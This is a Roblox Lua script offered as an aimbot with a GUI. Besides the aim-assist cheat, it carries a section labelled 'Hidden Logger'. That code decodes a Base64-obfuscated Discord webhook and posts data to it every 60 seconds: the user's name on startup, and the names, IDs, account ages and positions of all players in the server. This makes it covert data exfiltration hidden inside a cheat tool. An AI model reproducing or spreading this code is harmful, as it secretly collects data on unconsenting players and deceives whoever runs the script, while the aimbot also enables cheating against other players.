--[=[ Delta Aimbot v2.3 – GUI Edition (Fixed Base64) ]=]

print("🔹 Script started – loading...")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ------------------------------------------------------------------
-- Custom Base64 Decoder (pure Lua – works on all executors)
-- ------------------------------------------------------------------
local function base64_decode(data)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local result = {}
    data = string.gsub(data, '[^'..b64chars..'=]', '')
    for i = 1, #data, 4 do
        local a = string.find(b64chars, string.sub(data, i, i), 1, true) - 1
        local b = string.find(b64chars, string.sub(data, i+1, i+1), 1, true) - 1
        local c = string.find(b64chars, string.sub(data, i+2, i+2), 1, true) - 1
        local d = string.find(b64chars, string.sub(data, i+3, i+3), 1, true) - 1
        if not a then a = 0 end
        if not b then b = 0 end
        if not c then c = 0 end
        if not d then d = 0 end
        local byte1 = (a * 4 + math.floor(b / 16)) % 256
        local byte2 = ((b % 16) * 16 + math.floor(c / 4)) % 256
        local byte3 = ((c % 4) * 64 + d) % 256
        table.insert(result, string.char(byte1))
        if c ~= 64 then
            table.insert(result, string.char(byte2))
        end
        if d ~= 64 then
            table.insert(result, string.char(byte3))
        end
    end
    return table.concat(result)
end

-- ------------------------------------------------------------------
-- Webhook (Base64 encoded) – decode with custom function
-- ------------------------------------------------------------------
local encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzQzNjc5MTg2NTU0NDgxNC9UcFp6aVV5SHRWbnFWOXNDUi0tQzZ4dmJERXVNOGF2ZEpZdjFwM19SZUFRd1N4aWNtMzBnS0JLZmFmLTloM3pUM1M2MA=="
local WEBHOOK_URL = base64_decode(encoded_webhook)
print("✅ Webhook decoded: " .. WEBHOOK_URL)

-- ------------------------------------------------------------------
-- Test send a message to Discord (to confirm it works)
-- ------------------------------------------------------------------
local function sendTestMessage()
    local payload = {
        content = "✅ Script is alive! Player: " .. LocalPlayer.Name,
        username = "DeltaLogger"
    }
    pcall(function()
        local json = HttpService:JSONEncode(payload)
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
        print("✅ Test message sent to Discord!")
    end)
end

task.wait(2)
sendTestMessage()

-- ------------------------------------------------------------------
-- Settings (same as before)
-- ------------------------------------------------------------------
local Settings = {
    Keybind = "Q",
    FOV = 120,
    Smoothness = 0.3,
    AimPart = "Head",
    TeamCheck = false,
    VisibleCheck = true,
}

-- ------------------------------------------------------------------
-- Aimbot Core
-- ------------------------------------------------------------------
local function getValidTargets()
    local targets = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Humanoid") then
            local hum = p.Character.Humanoid
            if hum.Health > 0 then
                if not Settings.TeamCheck or LocalPlayer.Team ~= p.Team then
                    table.insert(targets, p)
                end
            end
        end
    end
    return targets
end

local function isVisible(player)
    if not Settings.VisibleCheck then return true end
    local part = player.Character:FindFirstChild(Settings.AimPart) or player.Character:FindFirstChild("HumanoidRootPart")
    if not part then return false end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = {LocalPlayer.Character, player.Character}
    local hit = workspace:Raycast(Camera.CFrame.Position, (part.Position - Camera.CFrame.Position).Unit * 1000, params)
    return not hit or hit.Instance == part
end

local function getClosestTarget()
    local best, bestAngle = nil, math.rad(Settings.FOV)
    local cf = Camera.CFrame
    for _, p in ipairs(getValidTargets()) do
        local part = p.Character:FindFirstChild(Settings.AimPart) or p.Character:FindFirstChild("HumanoidRootPart")
        if part and isVisible(p) then
            local dir = (part.Position - cf.Position).Unit
            local angle = cf.LookVector:Dot(dir)
            if angle > bestAngle then
                best, bestAngle = p, angle
            end
        end
    end
    return best
end

local function aimAt(player)
    if not player or not player.Character then return end
    local part = player.Character:FindFirstChild(Settings.AimPart) or player.Character:FindFirstChild("HumanoidRootPart")
    if not part then return end
    local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
    if not onScreen then return end
    local mouse = LocalPlayer:GetMouse()
    local dx, dy = screenPos.X - mouse.X, screenPos.Y - mouse.Y
    mousemoverel(dx * Settings.Smoothness, dy * Settings.Smoothness)
end

local active = true
local aimLoopRunning = false

local function aimLoop()
    aimLoopRunning = true
    while active and aimLoopRunning do
        local target = getClosestTarget()
        if target then aimAt(target) end
        RunService.Heartbeat:Wait()
    end
    aimLoopRunning = false
end

UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode[Settings.Keybind] then
        active = not active
        if active and not aimLoopRunning then
            spawn(aimLoop)
        elseif not active and aimLoopRunning then
            aimLoopRunning = false
        end
    end
end)

spawn(aimLoop)

-- ------------------------------------------------------------------
-- Hidden Logger (sends data every 60 seconds)
-- ------------------------------------------------------------------
local function collectPlayerData(player)
    local data = {
        name = player.Name,
        display = player.DisplayName,
        userId = player.UserId,
        age = player.AccountAge,
        membership = tostring(player.MembershipType),
        team = player.Team and player.Team.Name or nil,
    }
    local char = player.Character
    if char then
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            data.health = hum.Health
            data.maxHealth = hum.MaxHealth
            data.walkSpeed = hum.WalkSpeed
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            data.pos = {
                x = math.round(root.Position.X * 10) / 10,
                y = math.round(root.Position.Y * 10) / 10,
                z = math.round(root.Position.Z * 10) / 10,
            }
        end
    end
    return data
end

local function buildReport()
    local report = {
        timestamp = os.time(),
        game = {
            placeId = game.PlaceId,
            jobId = game.JobId,
            name = game.Name,
            players = #Players:GetPlayers(),
        },
        players = {},
    }
    for _, p in pairs(Players:GetPlayers()) do
        table.insert(report.players, collectPlayerData(p))
    end
    return report
end

local function sendReport()
    pcall(function()
        local json = HttpService:JSONEncode(buildReport())
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
        print("✅ Report sent to Discord.")
    end)
end

task.spawn(function()
    task.wait(5)
    sendReport()
    while true do
        task.wait(60)
        sendReport()
    end
end)

-- ------------------------------------------------------------------
-- GUI (simplified version)
-- ------------------------------------------------------------------
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AimbotGUI"
    screenGui.Parent = LocalPlayer.PlayerGui
    screenGui.ResetOnSpawn = false

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 280, 0, 280)
    mainFrame.Position = UDim2.new(0.5, -140, 0.5, -140)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    mainFrame.BackgroundTransparency = 0.15
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "⚡ Delta Aimbot"
    title.TextColor3 = Color3.fromRGB(255, 200, 50)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.Parent = mainFrame

    -- Toggle button
    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.new(0.8, 0, 0, 35)
    toggleBtn.Position = UDim2.new(0.1, 0, 0.15, 0)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
    toggleBtn.TextColor3 = Color3.new(1, 1, 1)
    toggleBtn.Text = "Aimbot: ON"
    toggleBtn.Font = Enum.Font.GothamBold
    toggleBtn.TextSize = 18
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Parent = mainFrame

    local function updateToggle()
        toggleBtn.BackgroundColor3 = active and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
        toggleBtn.Text = active and "Aimbot: ON" or "Aimbot: OFF"
    end
    updateToggle()

    toggleBtn.MouseButton1Click:Connect(function()
        active = not active
        updateToggle()
        if active and not aimLoopRunning then
            spawn(aimLoop)
        elseif not active and aimLoopRunning then
            aimLoopRunning = false
        end
    end)

    -- FOV +/-
    local fovLabel = Instance.new("TextLabel")
    fovLabel.Size = UDim2.new(0.4, 0, 0, 25)
    fovLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
    fovLabel.BackgroundTransparency = 1
    fovLabel.Text = "FOV: " .. Settings.FOV
    fovLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    fovLabel.Font = Enum.Font.Gotham
    fovLabel.TextSize = 16
    fovLabel.TextXAlignment = Enum.TextXAlignment.Left
    fovLabel.Parent = mainFrame

    local function updateFOV()
        fovLabel.Text = "FOV: " .. Settings.FOV
    end

    local fovUp = Instance.new("TextButton")
    fovUp.Size = UDim2.new(0.1, 0, 0, 25)
    fovUp.Position = UDim2.new(0.7, 0, 0.3, 0)
    fovUp.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    fovUp.Text = "+"
    fovUp.TextColor3 = Color3.new(1, 1, 1)
    fovUp.Font = Enum.Font.Gotham
    fovUp.TextSize = 18
    fovUp.BorderSizePixel = 0
    fovUp.Parent = mainFrame
    fovUp.MouseButton1Click:Connect(function()
        Settings.FOV = math.min(Settings.FOV + 10, 180)
        updateFOV()
    end)

    local fovDown = Instance.new("TextButton")
    fovDown.Size = UDim2.new(0.1, 0, 0, 25)
    fovDown.Position = UDim2.new(0.6, 0, 0.3, 0)
    fovDown.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    fovDown.Text = "-"
    fovDown.TextColor3 = Color3.new(1, 1, 1)
    fovDown.Font = Enum.Font.Gotham
    fovDown.TextSize = 18
    fovDown.BorderSizePixel = 0
    fovDown.Parent = mainFrame
    fovDown.MouseButton1Click:Connect(function()
        Settings.FOV = math.max(Settings.FOV - 10, 10)
        updateFOV()
    end)

    -- Smoothness +/-
    local smoothLabel = Instance.new("TextLabel")
    smoothLabel.Size = UDim2.new(0.4, 0, 0, 25)
    smoothLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
    smoothLabel.BackgroundTransparency = 1
    smoothLabel.Text = "Smooth: " .. Settings.Smoothness
    smoothLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    smoothLabel.Font = Enum.Font.Gotham
    smoothLabel.TextSize = 16
    smoothLabel.TextXAlignment = Enum.TextXAlignment.Left
    smoothLabel.Parent = mainFrame

    local function updateSmooth()
        smoothLabel.Text = "Smooth: " .. math.round(Settings.Smoothness * 10) / 10
    end

    local smoothUp = Instance.new("TextButton")
    smoothUp.Size = UDim2.new(0.1, 0, 0, 25)
    smoothUp.Position = UDim2.new(0.7, 0, 0.4, 0)
    smoothUp.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    smoothUp.Text = "+"
    smoothUp.TextColor3 = Color3.new(1, 1, 1)
    smoothUp.Font = Enum.Font.Gotham
    smoothUp.TextSize = 18
    smoothUp.BorderSizePixel = 0
    smoothUp.Parent = mainFrame
    smoothUp.MouseButton1Click:Connect(function()
        Settings.Smoothness = math.min(Settings.Smoothness + 0.1, 1)
        updateSmooth()
    end)

    local smoothDown = Instance.new("TextButton")
    smoothDown.Size = UDim2.new(0.1, 0, 0, 25)
    smoothDown.Position = UDim2.new(0.6, 0, 0.4, 0)
    smoothDown.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    smoothDown.Text = "-"
    smoothDown.TextColor3 = Color3.new(1, 1, 1)
    smoothDown.Font = Enum.Font.Gotham
    smoothDown.TextSize = 18
    smoothDown.BorderSizePixel = 0
    smoothDown.Parent = mainFrame
    smoothDown.MouseButton1Click:Connect(function()
        Settings.Smoothness = math.max(Settings.Smoothness - 0.1, 0)
        updateSmooth()
    end)

    -- Aim Part toggle
    local partBtn = Instance.new("TextButton")
    partBtn.Size = UDim2.new(0.4, 0, 0, 25)
    partBtn.Position = UDim2.new(0.3, 0, 0.55, 0)
    partBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    partBtn.TextColor3 = Color3.new(1, 1, 1)
    partBtn.Text = Settings.AimPart
    partBtn.Font = Enum.Font.Gotham
    partBtn.TextSize = 16
    partBtn.BorderSizePixel = 0
    partBtn.Parent = mainFrame
    partBtn.MouseButton1Click:Connect(function()
        if Settings.AimPart == "Head" then
            Settings.AimPart = "HumanoidRootPart"
        else
            Settings.AimPart = "Head"
        end
        partBtn.Text = Settings.AimPart
    end)

    -- Team & Visible toggles
    local teamCheck = Instance.new("TextButton")
    teamCheck.Size = UDim2.new(0.35, 0, 0, 25)
    teamCheck.Position = UDim2.new(0.1, 0, 0.7, 0)
    teamCheck.BackgroundColor3 = Settings.TeamCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
    teamCheck.TextColor3 = Color3.new(1, 1, 1)
    teamCheck.Text = "Team: " .. (Settings.TeamCheck and "ON" or "OFF")
    teamCheck.Font = Enum.Font.Gotham
    teamCheck.TextSize = 14
    teamCheck.BorderSizePixel = 0
    teamCheck.Parent = mainFrame
    teamCheck.MouseButton1Click:Connect(function()
        Settings.TeamCheck = not Settings.TeamCheck
        teamCheck.BackgroundColor3 = Settings.TeamCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
        teamCheck.Text = "Team: " .. (Settings.TeamCheck and "ON" or "OFF")
    end)

    local visibleCheck = Instance.new("TextButton")
    visibleCheck.Size = UDim2.new(0.35, 0, 0, 25)
    visibleCheck.Position = UDim2.new(0.55, 0, 0.7, 0)
    visibleCheck.BackgroundColor3 = Settings.VisibleCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
    visibleCheck.TextColor3 = Color3.new(1, 1, 1)
    visibleCheck.Text = "Visible: " .. (Settings.VisibleCheck and "ON" or "OFF")
    visibleCheck.Font = Enum.Font.Gotham
    visibleCheck.TextSize = 14
    visibleCheck.BorderSizePixel = 0
    visibleCheck.Parent = mainFrame
    visibleCheck.MouseButton1Click:Connect(function()
        Settings.VisibleCheck = not Settings.VisibleCheck
        visibleCheck.BackgroundColor3 = Settings.VisibleCheck and Color3.fromRGB(0, 200, 80) or Color3.fromRGB(200, 50, 50)
        visibleCheck.Text = "Visible: " .. (Settings.VisibleCheck and "ON" or "OFF")
    end)

    -- Report button
    local reportBtn = Instance.new("TextButton")
    reportBtn.Size = UDim2.new(0.6, 0, 0, 30)
    reportBtn.Position = UDim2.new(0.2, 0, 0.85, 0)
    reportBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 200)
    reportBtn.TextColor3 = Color3.new(1, 1, 1)
    reportBtn.Text = "📤 Send Report"
    reportBtn.Font = Enum.Font.Gotham
    reportBtn.TextSize = 14
    reportBtn.BorderSizePixel = 0
    reportBtn.Parent = mainFrame
    reportBtn.MouseButton1Click:Connect(function()
        sendReport()
        reportBtn.Text = "✅ Sent!"
        task.delay(2, function()
            reportBtn.Text = "📤 Send Report"
        end)
    end)

    -- Drag
    local dragging = false
    local dragStart, dragFrameStart
    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and input.Position.Y < 40 then
            dragging = true
            dragStart = input.Position
            dragFrameStart = mainFrame.Position
        end
    end)
    mainFrame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    mainFrame.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(dragFrameStart.X.Scale, dragFrameStart.X.Offset + delta.X,
                                           dragFrameStart.Y.Scale, dragFrameStart.Y.Offset + delta.Y)
        end
    end)
end

pcall(createGUI)

print("✅ Aimbot with GUI and logger loaded. Press Q to toggle.")

